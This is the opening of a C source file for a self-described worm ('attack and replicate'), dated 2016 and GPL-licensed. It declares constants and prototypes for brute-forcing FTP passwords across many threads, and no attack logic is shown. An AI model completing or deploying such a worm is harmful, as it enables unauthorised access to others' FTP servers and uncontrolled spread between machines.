/*
 * Worm - Simple mechanism for attack and replicate
 *
 * Copyright (C) 2016  Felix Yowtang Liu
 *                     Rafael Ravedutti Lucio Machado
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <time.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/types.h>

#define MAX_PASSWORD_LENGTH    8
#define FTP_LOGIN_TRIES        5
#define MAX_THREADS            40

int bruteforce(char *dest, unsigned int maxlength);
int ftp_try_login(const char *address, unsigned int port, const char *user, const char *password, int thread_id);
